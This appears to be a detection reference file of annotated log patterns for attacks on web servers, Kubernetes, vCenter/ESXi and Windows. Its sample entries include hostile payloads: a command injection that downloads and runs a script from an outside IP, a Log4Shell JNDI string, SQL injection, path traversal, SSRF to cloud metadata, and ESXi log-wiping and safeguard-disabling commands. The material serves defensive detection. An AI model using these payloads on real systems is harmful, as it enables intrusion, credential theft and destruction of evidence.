{"n":"ProxyShell exploit pattern on Exchange","d":"The autodiscover.json URI contains an @ and a backend path.","f":"cs-method: GET\ncs-uri-stem: /autodiscover/autodiscover.json - exploited Exchange Autodiscover endpoint\ncs-uri-query: contains an @ character pointing to the backend path /mapi/nspi/ (@evil.com/...) - signature pattern of ProxyShell (SSRF via Autodiscover)\nc-ip: 203.0.113.7 - actual client IP making the request (different from server s-ip)\ncs(User-Agent): python-requests/2.31.0 - automated exploitation tool\nsc-status: 200 - request processed successfully, time-taken: 31 (ms)","h":"cs-uri-stem /autodiscover/autodiscover.json with Email= or @ in the query; followed by access to a new .aspx file in the aspnet_client or owa/auth directory."},

{"n":"POST to an unfamiliar .aspx file","d":"A webshell is usually in a rarely used directory and accessed by only one IP.","f":"cs-method: POST\ncs-uri-stem: /aspnet_client/system_web/err.aspx - unfamiliar .aspx file sitting in a system folder that rarely holds custom content\ncs-uri-query: \"-\" - no query parameters\nc-ip: 203.0.113.7 - only one IP accessing this file\ncs(User-Agent): \"-\" - empty, unusual for normal web application traffic\nsc-status: 200 - access/execution succeeded","h":"An .aspx file called by only one IP, no Referer, mostly POST; w3wp.exe spawning cmd/powershell at the same time."},

{"n":"SQL injection","d":"Payload in the query string; often paired with status 500 or a long response time.","f":"\"%r\": \"GET /search?q=1' UNION SELECT username,password FROM users-- -\" - SQL injection payload sits in the q query-string parameter\n%>s: 500 - server error, typically from the injected payload breaking SQL syntax\n%b: 312 - size of the returned error page\nUser-Agent: \"sqlmap/1.8#stable\" - automated SQLi exploitation tool, a clear attack indicator","h":"UNION SELECT, ' OR 1=1, SLEEP(, WAITFOR DELAY, information_schema, xp_cmdshell, CHAR(; a spike in status 500; sqlmap UA. Cross-check backend DB errors to confirm the payload executed."},

{"n":"Reading files via path traversal","d":"A file/path parameter contains ../ or an encoded form of it.","f":"\"%r\": \"GET /download?file=..%2F..%2F..%2F..%2Fetc%2Fpasswd\" - the file parameter contains URL-encoded ../ sequences to escape the web root (path traversal)\n%>s: 200 - file read succeeded, not blocked\n%b: 1843 - size of the file content returned (e.g. /etc/passwd)\nUser-Agent: curl/8.4.0 - command-line tool commonly used for manual exploitation","h":"../, %2e%2e%2f, ..%5c, /etc/passwd, win.ini, WEB-INF/web.xml; status 200 with a size matching a system file."},

{"n":"JNDI string injection (Log4Shell)","d":"The payload can appear in the URI, User-Agent, or any logged header.","f":"\"%r\": \"GET / HTTP/1.1\" - the request URI itself looks benign, carrying no payload\nUser-Agent: \"${jndi:ldap://203.0.113.7:1389/Exploit}\" - JNDI (Log4Shell) string placed in the User-Agent header for log4j to process and trigger an outbound connection\n%>s: 200 - server responded normally even though the payload was processed/logged\nNote: the JNDI payload can appear in any logged header or parameter, not only User-Agent","h":"jndi:, ${lower:, ${::-j}; then check for outbound LDAP/RMI connections from the application server."},

{"n":"OS command injection","d":"Command-chaining characters in a parameter.","f":"\"%r\": \"GET /ping?host=127.0.0.1%3Bcurl%20203.0.113.7%2Fa.sh%7Csh\" - the host parameter contains URL-encoded command-chaining characters ; and pipe | to inject an OS command (download and run a.sh)\n%>s: 200 - command executed and output returned\n%b: 88 - size of the command output\nUser-Agent: curl/8.4.0","h":";, |, &&, $(, backtick, %0a combined with curl, wget, id, whoami, nc."},

{"n":"Webshell access","d":"A new file in an upload/static directory, called via POST from a single source.","f":"%h: same IP for both requests\n\"%r\": \"POST /uploads/avatar/a1.jsp\" - unfamiliar .jsp file in an upload/static folder meant to hold only static files\n%>s: 200 on both calls\n%b: 74 then 1290 - the second response is much larger, suggesting the webshell executed a command and returned output\nUser-Agent: Mozilla/5.0 - spoofed as a normal browser to evade detection","h":"An executable file (.jsp, .php, .aspx) in an upload directory; no Referer; few IPs calling it; response size varies with the command."},

{"n":"Directory / vulnerability scanning","d":"Many 404s in a short time from one IP.","f":"%h: the same IP repeating within a short time window\n\"%r\": \"GET /wp-login.php\", \"GET /.git/HEAD\", ... - mass probing of sensitive paths/files that do not exist on the server\n%>s: 404 repeated for most requests\nUser-Agent: \"Nuclei\" - automated vulnerability scanner, a clear scanner fingerprint","h":"User-Agent: Nuclei, Nikto, sqlmap, gobuster, ffuf, dirbuster, zgrab, masscan; even if the UA is spoofed, the high 404 ratio and request rate still give it away."},

{"n":"Login form brute force","d":"Repeated POSTs to the login endpoint.","f":"%h: the same IP across attempts\n\"%r\": \"POST /login\" repeated many times in a short period against the same login endpoint\n%>s: 401 (invalid credentials) repeated, then 302 (login succeeded) - a password-guessing sequence\nUser-Agent: python-requests/2.31.0 - automated scripted client, not a real user","h":"A run of 401s ending in a 302/200 from the same IP: the password may have been guessed correctly. Cross-reference the application log to identify which user."},

{"n":"Server-side request forgery","d":"A URL parameter points to an internal address or a cloud metadata endpoint.","f":"\"%r\": \"GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/\" - the url parameter points at the cloud provider's internal metadata address (169.254.169.254) instead of a legitimate domain\n%>s: 200 - the backend server made the internal request on the attacker's behalf and returned the result\n%b: 412 - response size, potentially containing sensitive data (IAM credentials)\nUser-Agent: curl/8.4.0","h":"169.254.169.254, metadata.google.internal, localhost, 127.0.0.1, the 10.x/172.16.x/192.168.x ranges, file://, gopher://."},

{"n":"Cross-site scripting","d":"A script tag or event handler inside a parameter.","f":"\"%r\": \"GET /search?q=<script>alert(document.cookie)</script>\" - the q parameter contains a URL-encoded <script> tag reflected back in the result page (reflected XSS)\n%>s: 200 - server responded normally without filtering/escaping the payload\n%b: 2210 - size of the returned page containing the payload\nUser-Agent: Mozilla/5.0 - request came from an actual browser","h":"<script, onerror=, javascript:, %3Csvg."},

{"n":"Structure of an audit event","d":"Each line is one JSON object. The core fields answer who did what, where, and with what result.","f":"user.username / user.groups: identity (system:serviceaccount:<ns>:<sa> is a service account)\nverb: get, list, watch, create, update, patch, delete\nobjectRef.resource / subresource / namespace / name\nsourceIPs, userAgent\nresponseStatus.code: 200/201 success, 403 blocked by RBAC\nannotations authorization.k8s.io/decision: allow / forbid","h":""},

{"n":"Exec into a container","d":"verb=create (or get with older clients), resource=pods, subresource=exec.","f":"verb: API verb called — \"create\" means opening a new stream (the exec command)\nuser.username: the user or ServiceAccount performing the exec\nsourceIPs: source IP address(es) of the requester\nrequestURI: full API path, containing the command/container/stdin/tty parameters run\nobjectRef.resource/subresource: resource=\"pods\", subresource=\"exec\" confirms this is an exec into a pod (with the pod's namespace/name)\nresponseStatus.code: response code; 101 (Switching Protocols) means the interactive exec session was opened","h":"Exec into the production namespace; a CI/CD service account running an interactive exec (stdin=true&tty=true); command=sh/bash."},

{"n":"Reading a Secret","d":"Need to distinguish a legitimate controller from a user/service account bulk-reading secrets.","f":"verb: action — \"list\" (or \"get\") reading a secret\nuser.username: the user/ServiceAccount performing the read\nsourceIPs: source IP of the requester\nuserAgent: client making the call; an unusual value like curl/... instead of a standard K8s client is suspicious\nobjectRef.resource/namespace: resource=\"secrets\", the namespace whose secret(s) were read (no name means the whole list was read)\nresponseStatus.code: 200 — read succeeded","h":"The default SA or an application SA listing secrets; userAgent is curl/python (a token stolen from a pod); listing secrets cluster-wide."},

{"n":"Create/modify a ClusterRoleBinding","d":"Privilege escalation by binding cluster-admin.","f":"verb: \"create\" — a new binding is created\nuser.username: the user performing the action\nobjectRef.resource/apiGroup/name: resource=\"clusterrolebindings\", apiGroup=\"rbac.authorization.k8s.io\", name of the new binding\nrequestObject.roleRef: the ClusterRole referenced; \"cluster-admin\" is the highest privilege in the cluster\nrequestObject.subjects: the ServiceAccount/user/group granted the role via this binding\nresponseStatus.code: 201 — creation succeeded","h":"roleRef cluster-admin or a role with verbs ['*']; the subject is the default SA or the system:authenticated/system:anonymous group."},

{"n":"Creating a privileged pod","d":"Requires audit level Request or higher to see requestObject.","f":"securityContext.privileged=true\nhostPID / hostNetwork / hostIPC=true\nvolumes.hostPath.path=/ or /var/run/docker.sock","h":"A privileged pod + hostPath / is a container escape route to the node."},

{"n":"Anonymous access","d":"Unauthenticated request (when --anonymous-auth=true).","f":"verb: the action called (e.g. \"list\")\nuser.username: \"system:anonymous\" — the special identity for unauthenticated requests\nuser.groups: \"system:unauthenticated\" — the default group assigned to every anonymous request\nsourceIPs: source IP of the requester\nrequestURI: the endpoint accessed anonymously\nresponseStatus.code: response code (403 if RBAC denies it; may succeed if anonymous has permissions — check the --anonymous-auth setting)","h":"Any anonymous request returning code 200 other than /healthz, /version, /readyz needs immediate investigation."},

{"n":"Mass RBAC denials","d":"Permission probing (kubectl auth can-i, reconnaissance tools).","f":"verb: the denied action (e.g. \"list\")\nuser.username: the user/ServiceAccount making the request\nobjectRef.resource: the resource type queried (e.g. \"nodes\")\nresponseStatus.code/reason: 403/\"Forbidden\" — blocked by RBAC\nannotations[\"authorization.k8s.io/decision\"]: \"forbid\" — the authorization decision, confirming this was a permission denial","h":"A single identity receiving many 403s across multiple resource types within minutes."},

{"n":"Creating a token for a ServiceAccount","d":"TokenRequest API; attackers use it to obtain a token for a highly privileged service account.","f":"verb: \"create\" — calling the TokenRequest API to mint a new token\nuser.username: the user/account requesting the token\nobjectRef.resource/subresource: resource=\"serviceaccounts\", subresource=\"token\"\nobjectRef.namespace/name: namespace and name of the ServiceAccount issued the token (notable if the SA is highly privileged, e.g. in kube-system)\nresponseStatus.code: 201 — token minted successfully","h":""},

{"n":"Port-forward or proxy","d":"Opens a path into an internal service from an admin machine.","f":"verb: \"create\" — opening a port-forward or proxy connection\nuser.username: the user performing the action\nobjectRef.resource/subresource: resource=\"pods\" (or \"services\"), subresource=\"portforward\"/\"proxy\"\nobjectRef.namespace/name: the target pod/service being forwarded to\nresponseStatus.code: 101 — the tunnel connection was established (Switching Protocols)","h":""},

{"n":"Deleting Events","d":"Erasing operational traces.","f":"verb: \"deletecollection\" (or \"delete\") — removing all or one event\nuser.username: the account performing the deletion\nobjectRef.resource/namespace: resource=\"events\", the namespace whose events were deleted\nresponseStatus.code: 200 — deletion succeeded","h":""},

{"n":"Creating a DaemonSet/CronJob in kube-system","d":"Persistence that runs on every node or on a schedule.","f":"verb: \"create\"\nuser.username: the account creating the workload\nobjectRef.resource/apiGroup: resource=\"daemonsets\" (apiGroup=\"apps\") or \"cronjobs\" (apiGroup=\"batch\")\nobjectRef.namespace: \"kube-system\" — a sensitive namespace; the workload runs on every node or on a schedule with elevated privilege\nobjectRef.name: name of the created object\nresponseStatus.code: 201 — creation succeeded","h":""},

{"n":"Kubelet log","d":"journald on the node; klog format.","f":"Oct 24 02:11:05 worker-01: timestamp and node name added by journald/syslog\nkubelet[1422]: process name and PID of kubelet on the node\nE1024 02:11:05.123456: the first character is the klog level (E=Error, I=Info, W=Warning, F=Fatal), followed by klog's internal timestamp\nthreadid (\"1422\" after the timestamp): klog's internal logging thread id\npod_workers.go:1298: source file and line that emitted the log\nmessage/err/pod: the log text and structured context fields — here identifying which pod/container failed (CrashLoopBackOff)","h":"The kubelet API (10250) doesn't log requests by default; protect it with --anonymous-auth=false and --authorization-mode=Webhook."},

{"n":"Container log (CRI format)","d":"Each line: timestamp, stream (stdout/stderr), flag P (partial) or F (full), content.","f":"timestamp: \"2026-10-24T02:11:05.123456789Z\" — log time in RFC3339Nano format\nstream: \"stdout\"/\"stderr\" — the output stream of the process inside the container\ntag: \"F\" (full line) or \"P\" (partial — line was split and continues on the next entry)\nlog content: the rest of the line — the log text written by the application inside the container (here JSON emitted by the app itself)","h":""},

{"n":"API server process log","d":"Authentication, webhook, and etcd errors.","f":"E (first character): klog level — Error\n1024 02:10:11.120345: klog's internal timestamp (mmdd hh:mm:ss.microsec)\nthreadid (\"1\"): the logging thread id of the kube-apiserver process\nauthentication.go:73: source file and line that emitted the log\nmessage: \"Unable to authenticate the request\" — the error description\nerr: the underlying cause (e.g. an invalid bearer token or an expired ServiceAccount token)","h":"Repeated invalid bearer token errors: an old or stolen token is being tried."},

{"n":"etcd log","d":"TLS connection to etcd rejected.","f":"level: log level (\"warn\") in etcd's zap JSON format\nts: timestamp in RFC3339 format\ncaller: source file:line in etcd that emitted the log\nmsg: description of the event (\"rejected connection\")\nremote-addr: IP:port of the client attempting to connect to etcd\nerror: reason for rejection (e.g. missing client certificate when mTLS is required)","h":"A connection to 2379/2380 from outside the control plane."},

{"n":"Container runtime log","d":"journalctl -u containerd or crio.","f":"time: timestamp in RFC3339 format recorded by containerd\nlevel: log level (info/warn/error)\nmsg: the action performed (e.g. \"PullImage\")\nimage/object name in msg: the image or container involved in the action (e.g. \"docker.io/library/alpine:latest\")","h":""},

{"n":"Pulling an image from an unlisted registry","d":"A Normal-type event that still has security value.","f":"NAMESPACE: namespace of the involvedObject\nLAST SEEN: time since the event's lastTimestamp (lastTimestamp/count)\nTYPE: event type — Normal/Warning\nREASON: short reason code (\"Pulled\")\nOBJECT: kind/name of the involvedObject\nMESSAGE: detailed text — here naming the registry and image pulled (compare against the allow-listed registries)","h":"An image from public Docker Hub in an environment that should only use an internal registry; the name contains xmrig, miner; tag latest."},

{"n":"CrashLoopBackOff","d":"Container repeatedly failing to start.","f":"NAMESPACE: namespace of the involved pod\nLAST SEEN: time since the event was last recorded\nTYPE: \"Warning\"\nREASON: \"BackOff\" — kubelet is delaying before the next container restart attempt\nOBJECT: the involved pod (involvedObject)\nMESSAGE: which container/pod keeps restarting and why","h":""},

{"n":"Pod cannot be scheduled","d":"Insufficient resources, taints, affinity.","f":"NAMESPACE: namespace of the unscheduled pod\nLAST SEEN: time since the event was last recorded\nTYPE: \"Warning\"\nREASON: \"FailedScheduling\" — the scheduler could not find a suitable node\nOBJECT: the involved pod (involvedObject)\nMESSAGE: specific reason each node was excluded (insufficient CPU, untolerated taint, etc.)","h":""},

{"n":"Container OOM-killed / pod evicted","d":"Can be caused by a cryptominer or a DoS.","f":"NAMESPACE: namespace of the affected pod\nLAST SEEN: time since the event was last recorded\nTYPE: \"Warning\"\nREASON: \"Evicted\" (or OOMKilling) — the pod/container was killed due to resource pressure\nOBJECT: the involved pod (involvedObject)\nMESSAGE: specific reason — the resource threshold and amount available at eviction time","h":""},

{"n":"Successful vCenter login","d":"vim.event.UserLoginSessionEvent.","f":"userName, ipAddress, userAgent","h":"Login from an IP outside the admin range; userAgent is pyvmomi/PowerCLI from a regular workstation; administrator@vsphere.local used outside the break-glass procedure."},

{"n":"Failed vCenter login","d":"vim.event.BadUsernameSessionEvent.","f":"eventTypeId: event class (vim.event.BadUsernameSessionEvent) – failed SSO login due to wrong username/password\nfullFormattedMessage: description text containing the target username and source IP as \"Cannot login <user>@<IP>\"\nuserName: usually empty since no session was created; the attempted username is embedded in fullFormattedMessage\ncreatedTime: time vCenter recorded the event\nchainId/key: ID used to correlate repeated failed logins from the same source","h":""},

{"n":"vCenter logout","d":"Includes the number of API calls made during the session.","f":"userName: the logged-out account (e.g. CORP\\adm_thanh)\nipAddress: client IP of the session\nloginTime: time the session originally logged in\ncallCount: number of API calls made during the session (unusually high may indicate abuse)\nuserAgent: client used to connect (vSphere Client, PowerCLI, govc, etc.)\nsessionId: session ID, used to correlate activity from the same session in other logs","h":"A very high number of API invocations in a short session: an automation script or reconnaissance."},

{"n":"Permission granted on inventory","d":"vim.event.PermissionAddedEvent; similarly PermissionUpdatedEvent, PermissionRemovedEvent.","f":"entity: inventory object the permission applies to (e.g. Datacenters, folder, VM)\nrole: role assigned (name/role ID, e.g. Administrator)\nusername: account or group granted the permission (e.g. CORP\\svc_backup2)\ngroup: boolean flag indicating whether the principal is a user or a group\npropagate: whether the permission propagates to child objects\nuserName: account that performed the permission change (actor)","h":"The Administrator role at the root/Datacenter level granted to a new user or a broad group."},

{"n":"Creating / modifying a role","d":"A new role, or privileges added to a role.","f":"role: name and ID of the role created/modified (e.g. Operator)\nprivilegesAdded: list of privileges added to the role (RoleUpdatedEvent only)\nprivilegesRemoved: list of privileges removed from the role (RoleUpdatedEvent only)\nuserName: account that made the role change\ncreatedTime: time of the change","h":""},

{"n":"VM powered off","d":"vim.event.VmPoweredOffEvent.","f":"vm: name and moref of the VM that was powered off (e.g. SRV-DB01)\nhost: ESXi host running the VM\ndatacenter: datacenter containing the VM\nuserName: account that performed the power-off (empty if triggered by the system/HA)\ncreatedTime: time the event occurred","h":"Multiple VMs powered off in succession outside of a scheduled window: a sign of preparation for datastore encryption."},

{"n":"VM deleted","d":"vim.event.VmRemovedEvent.","f":"vm: name of the deleted VM (e.g. SRV-APP07)\nhost: ESXi host that previously ran the VM\ndatacenter: datacenter containing the VM\nuserName: account that deleted the VM\ncreatedTime: time of deletion","h":""},

{"n":"VM reconfigured","d":"Adding/removing a disk, attaching an ISO, changing the network.","f":"vm: the VM that was reconfigured (e.g. TMP-VM01)\nconfigSpec: the change detail, shown as \"Modified: <property path>: <old value> -> <new value>\" (e.g. adding a disk, changing network)\nhost/datacenter: VM location\nuserName: account that made the configuration change\ncreatedTime: time of the change","h":"Attaching a Domain Controller's VMDK to another VM: a way to steal NTDS.dit without touching the DC."},

{"n":"Clone VM","d":"vim.event.VmClonedEvent / VmBeingClonedEvent.","f":"vm: the newly created clone VM (e.g. DC01-copy)\nsourceVm: the source VM the clone was made from (e.g. SRV-DC01)\nhost/datacenter: where the clone VM is placed\nuserName: account that performed the clone\ncreatedTime: time of the clone operation","h":"Cloning a DC, DB server, or HSM VM."},

{"n":"Creating / deleting a snapshot","d":"A TaskEvent for a snapshot task.","f":"info.descriptionId: task type (e.g. vm.Snapshot.removeAll, vm.Snapshot.create)\ninfo.entityName: name of the affected VM/object\ninfo.reason: identifies the user who initiated the task (\"initiated by\")\ninfo.state/info.result: task status and result (success/error)\ninfo.startTime/completeTime: task start/completion time","h":"Deleting all snapshots across multiple VMs: destroying recovery capability."},

{"n":"Guest operation via VMware Tools","d":"com.vmware.vc.guestOperations.GuestOperation: running a program/pushing a file into the guest without going over the network.","f":"eventTypeId: com.vmware.vc.guestOperations.GuestOperation\nvm: the VM the guest operation was performed on (e.g. SRV-APP01)\nuserName: account used for the guest operation (the in-guest credential, not the vSphere login)\narguments/message: the specific operation type (Start Program, Transfer File, List Directory, etc.)\ncreatedTime: time the operation occurred","h":"Lateral movement that doesn't traverse the network: invisible to network firewall/EDR."},

{"n":"SSH / ESXi Shell enabled on host","d":"Event forwarded from the host up to vCenter.","f":"eventTypeId: host-originated event code forwarded to vCenter (e.g. esx.audit.ssh.enabled, esx.audit.shell.enabled)\nhost: ESXi host that raised the event\nuserName: account that enabled the service (usually root, or vpxuser if done via vCenter)\nfullFormattedMessage: description text (SSH/Shell access has been enabled)\ncreatedTime: time of the event","h":"Enabling SSH outside a maintenance window is a common first step in ESXi ransomware attacks."},

{"n":"Lost connection to host","d":"vim.event.HostConnectionLostEvent / HostDisconnectedEvent.","f":"host: the ESXi host that lost connectivity\ndatacenter: datacenter containing the host\nfullFormattedMessage: description text (host is not responding)\ncreatedTime: time the disconnection was detected\nuserName: usually empty since this is a system-detected event","h":""},

{"n":"SSO login failure","d":"audit_events.log, one JSON object per line.","f":"user: the SSO account that attempted to log in (e.g. administrator@vsphere.local)\nclient: source IP of the login attempt\ntimestamp: time of the event (GMT)\ndescription: detailed text including user@IP and the failure reason (e.g. Invalid credentials)\ntype: SSO event type (com.vmware.sso.LoginFailure)\neventSeverity: severity level (usually INFO even for login failures)","h":""},

{"n":"SSO login success","d":"","f":"user: the SSO account that logged in successfully (e.g. adm_thanh@corp.local)\nclient: source IP of the login\ntimestamp: time of the event (GMT)\ndescription: detailed text including user@IP and the response code (e.g. response code 200)\ntype: SSO event type (com.vmware.sso.LoginSuccess)\neventSeverity: severity level (usually INFO)","h":""},

{"n":"SSO user/group management","d":"Creating a local SSO user, adding it to the Administrators group.","f":"user: the account performing the SSO administrative action (actor)\nclient: source IP of the action\ndescription: details of the action (e.g. adding a principal to the Administrators group)\ntype: com.vmware.sso.PrincipalManagement\ntimestamp: time of the action","h":"A new vsphere.local user, especially one added to Administrators."},

{"n":"vCenter service log (vpxd)","d":"Each task has a BEGIN/FINISH task entry with an opID.","f":"timestamp: log timestamp (ISO8601 with timezone)\nloglevel/process[pid]: log level (info/warning/error) and the vpxd process with its PID\nsub=: subsystem that emitted the line (e.g. vpxLro = long-running operation)\nopID=: operation ID used to correlate related log lines across services for the same operation\ntask-NNNN: vCenter task ID (BEGIN/FINISH mark the start/end)\nvim.VirtualMachine.powerOff: the API/operation invoked, along with the object moref (vm-1021) and actor/session UUID","h":"Use the opID to correlate a UI action with hostd.log on ESXi."},

{"n":"Shell login to the appliance","d":"VCSA's Photon OS log; the exact location depends on the version (journald, /var/log/messages, /var/log/audit/).","f":"timestamp: log timestamp (syslog format)\nhostname: VCSA appliance hostname (e.g. vcsa01)\nprocess[pid]: the sshd process and PID handling the connection\nAccepted/Failed password/publickey for: authentication result and the account used (e.g. root)\nfrom <IP> port <port>: source IP and port of the connection\nssh2: session protocol","h":"SSH into the VCSA outside normal procedure; unfamiliar commands in root's bash history."},

{"n":"Successful SSH to ESXi","d":"/var/log/auth.log.","f":"timestamp: Event time (UTC, ISO 8601) at the start of the auth.log line\nsshd[pid]: SSH daemon process and PID handling the login session\nAccepted <method>: Successful authentication and method used (keyboard-interactive/pam, publickey, password...)\nfor <user>: Account used to log in (e.g. root)\nfrom <IP>: Source IP address of the SSH connection\nport <port> ssh2: Client-side source TCP port and SSH2 protocol","h":""},

{"n":"Failed SSH to ESXi","d":"","f":"timestamp: Log time (UTC)\nsshd[pid]: SSH daemon process and PID\nerror: PAM: Authentication failure: PAM authentication failure message\nfor <user>: Account that was denied login (e.g. root)\nfrom <IP>: Source IP address of the login attempt","h":""},

{"n":"Enumerating and killing VMs via commands","d":"/var/log/shell.log records every ESXi Shell command. This sequence is highly characteristic of ESXi ransomware.","f":"timestamp: Command execution time (UTC); each shell.log line is one command\nshell[pid]: ESXi Shell (busybox) process and session PID\n[user]: Account typing the command in the ESXi Shell (e.g. root)\ncommand: Full command line executed (vim-cmd vmsvc/getallvms, esxcli vm process list, esxcli vm process kill)\n--world-id=<id>: World ID (running process) of the target VM being killed\n--type=force: Forced kill mode, does not wait for a graceful VM shutdown","h":"Usually followed by downloading a binary into /tmp, chmod +x, and running it with arguments pointing at /vmfs/volumes."},

{"n":"Disabling the block on executing non-VIB binaries","d":"Allows running a self-introduced binary (the encryptor).","f":"timestamp: Command execution time (UTC)\nshell[pid]: ESXi Shell process and session PID\n[user]: Account executing the command (e.g. root)\nesxcli system settings kernel set: Command that changes an ESXi kernel setting\n-s execInstalledOnly: Kernel option name controlling whether only binaries from signed/installed VIBs may execute\n-v FALSE: New value, disables the restriction so arbitrary binaries can run (e.g. a ransomware encryptor)","h":""},

{"n":"Deleting logs / disabling syslog forwarding","d":"","f":"timestamp: Command execution time (UTC)\nshell[pid]: ESXi Shell process and session PID\n[user]: Account executing the command (e.g. root)\nesxcli system syslog config set --loghost='': Clears the remote syslog host setting, stopping log forwarding\nrm -f /var/log/*.log: Command that deletes all local log files on the ESXi host","h":"Syslog from the host suddenly stopping in the SIEM is a signal worth alerting on (heartbeat/log-gap)."},

{"n":"Host Client / API login to ESXi","d":"/var/log/hostd.log.","f":"timestamp: Log time (UTC, with milliseconds)\ninfo: hostd log severity level\nhostd[pid]: Host agent (hostd) process and PID\nOriginator@6876 sub=Vimsvc.ha-eventmgr: Component/subsystem that raised the event (hostd event manager)\nEvent <id>: VIM event code (2211 = successful login)\nUser <user>@<IP> logged in as <client>: Account, source IP, and client/user-agent used to log in (Host Client, API, PowerCLI...)","h":"Logging directly into the host (bypassing vCenter) when the host should be in lockdown mode."},

{"n":"Failed ESXi login (hostd)","d":"","f":"timestamp: Log time (UTC, with milliseconds)\ninfo: hostd log severity level\nhostd[pid]: Host agent (hostd) process and PID\nOriginator@6876 sub=Vimsvc.ha-eventmgr: Component that raised the event (hostd event manager)\nEvent <id>: VIM event code (2208 = failed login)\nCannot login <user>@<IP>: Account and source IP whose login was rejected","h":""},

{"n":"VMkernel log","d":"Storage, network, hardware.","f":"timestamp: Log time (UTC, with milliseconds)\ncpuN:worldID: CPU core handling the event and the world ID (kernel process/thread) that logged it\nWARNING: Severity of the VMkernel message (WARNING/ALERT/INFO...)\nNMP: VMkernel module/subsystem involved (e.g. Native Multipathing for storage paths)\nnmp_DeviceRequestFastDeviceProbe:237: Kernel source function and line number that logged the message, useful for KB lookups\nmessage: Detailed event content (e.g. storage device 'naa....' changed path state)","h":""},

{"n":"Installing a VIB / update","d":"/var/log/esxupdate.log.","f":"timestamp: Log time (UTC)\nesxupdate: Name of the process logging VIB/image profile install and update operations\npid: PID of the esxupdate process (e.g. 2103400)\nuser: Account performing the install/update (e.g. root)\nINFO: Log severity level\nCommand = <cmd>: esxcli/esxupdate command executed (e.g. profile.install with --no-sig-check to bypass signature checking)","h":"A VIB installed with --no-sig-check or CommunitySupported acceptance level on a production host."},

{"n":"Local account locked","d":"/var/log/vobd.log.","f":"timestamp: VOB log time (UTC)\n[UserLevelCorrelator]: vobd component that correlates user-level events\n[esx.audit.account.locked]: VOB audit event name — local account has been locked\nuser account 'root': Local account that was locked\nlocked for <N> seconds: Lockout duration in seconds (default 900s)\nafter <N> failed login attempts: Number of failed logins that triggered the lockout","h":""},

{"n":"Lockdown mode disabled","d":"The host is no longer forced to be managed through vCenter.","f":"timestamp: VOB log time (UTC)\n[UserLevelCorrelator]: vobd component correlating the event\n[esx.audit.lockdownmode.disabled]: VOB audit event name — lockdown mode has been disabled\nAdministrator access to the host has been enabled: Message confirming direct administrative access (root via SSH/DCUI/local API) was re-enabled, meaning lockdown mode was turned off","h":""},

{"n":"Installing an image bypassing signature verification","d":"A VIB/image profile installed without verifying signature and acceptance level.","f":"timestamp: VOB log time (UTC)\n[UserLevelCorrelator]: vobd component correlating the event\n[esx.audit.esximage.install.novalidation]: VOB audit event name — image/VIB install bypassing signature and acceptance-level verification\nmessage: High security risk warning because the image profile was installed without signing/acceptance-level checks","h":"Associated with campaigns that install malicious VIBs as an ESXi backdoor."},

{"n":"SSH session opened","d":"","f":"timestamp: VOB log time (UTC)\n[UserLevelCorrelator]: vobd component correlating the event\n[esx.audit.ssh.session.opened]: VOB audit event name — an SSH session was opened\n'<user>@<IP>': Account and source IP address of the newly opened SSH session","h":""},

{"n":"User right assigned / removed","d":"4704: a user right (SeDebugPrivilege, SeImpersonatePrivilege, SeLoadDriverPrivilege, etc.) is assigned to an account. 4705: a user right is removed. Logged on the machine where the local policy changed, under the Audit Authorization Policy Change subcategory.","f":"TargetSid: the account granted/stripped of the right\nPrivilegeList (New Right/User Right): the right's name — note SeImpersonatePrivilege (a Juicy Potato/Rogue Potato precursor), SeDebugPrivilege, SeTcbPrivilege, SeLoadDriverPrivilege","h":""},

{"n":"Group membership logged with logon","d":"Always accompanies 4624, listing every group SID the just-logged-on account belongs to — lets you tell at a glance whether the logon session is privileged without further lookups. Requires Success auditing enabled for both Audit Group Membership and Audit Logon.","f":"TargetLogonId: matches the TargetLogonId of the corresponding 4624\nGroupMembership: list of group SIDs — watch for RID 512/519/544 (Domain Admins/Enterprise Admins/Administrators)","h":""},

{"n":"Handle requested to an AD/SAM object","d":"A handle is requested to an AD or SAM (Security Account Manager) object, e.g. when enumerating/reading domains, users, or groups in SAM. Requires Audit Directory Service Access or Audit SAM, plus Success auditing for Audit Handle Manipulation.","f":"ObjectServer=Security Account Manager: SAM was accessed\nObjectType=SAM_DOMAIN/SAM_USER/SAM_GROUP/SAM_ALIAS: the SAM object type\nAccessMask: the access requested","h":""},

{"n":"DPAPI Master Key backup / recovery","d":"4692: a machine backs up its DPAPI Master Key to a domain controller (the recovery mechanism used on password change). 4693: a Master Key is recovered from the DC. An unusual burst across many users/machines in a short window suggests abuse of the domain DPAPI backup key to mass-decrypt secrets (Mimikatz dpapi::masterkey, lsadump::backupkeys).","f":"MasterKeyId: the master key's ID\nRecoveryServer: the domain controller contacted\nStatus Code=0x0 (or 0x380000 for a successful recovery): the result","h":""},

{"n":"Credential Manager backup / restore","d":"5376: a user backs up all credentials in Credential Manager (Control Panel > Back up Credentials). 5377: a restore from backup. This action is very rare in normal use; Microsoft recommends alerting on every occurrence, combined with 5379 to detect theft of saved credentials.","f":"SubjectUserName: Account performing the backup/restore\nSubjectDomainName: Domain of the account\nSubjectLogonId: Logon session ID performing the action","h":""},

{"n":"Certificate request / issuance / denial (AD CS)","d":"Logged on the AD Certificate Services (CA) server. 4886: the CA receives a certificate request; 4887: a certificate is issued; 4888: a request is denied. Requires 'Issue and Manage Certificate Requests' enabled in the CA's Audit tab along with the Certification Services subcategory. Important for detecting abuse of exploitable certificate templates (e.g. ESC1 and other AD CS vulnerabilities).","f":"Requester: the account requesting the certificate\nCertificateTemplate: the template used — watch for templates allowing arbitrary SAN or granting Client Authentication/Domain Controller rights","h":""},

{"n":"Event Log service stopped","d":"The Windows Event Log service is disabled/stopped. Normal during a system shutdown, but a standalone occurrence (not accompanied by a shutdown) or one immediately before 1102 (log cleared) is a sign of an attacker trying to halt logging before acting.","f":"Computer: Machine where the Event Log service stopped (no other EventData; correlate the timestamp with a shutdown event to tell a normal stop from an attacker halting logging)","h":""},

{"n":"System time changed (Kernel-General)","d":"System clock was changed — not a normal Windows Time service (w32time) sync. Logs the old time, new time, and the process that called SetSystemTime. A classic anti-forensics indicator (winding the clock back/forward to skew log timestamps, then restoring the real time).","f":"OldTime, NewTime, ProcessId: the process that made the change","h":""},

{"n":"Service failed to start","d":"The Service Control Manager could not start a service. The message's second line gives the specific cause (disabled, bad credentials, timeout, missing file, or a blocked driver). Worth watching when a security/EDR service repeatedly fails to start.","f":"Service name; the accompanying error code/description (e.g. access denied, file not found, service disabled)","h":""},

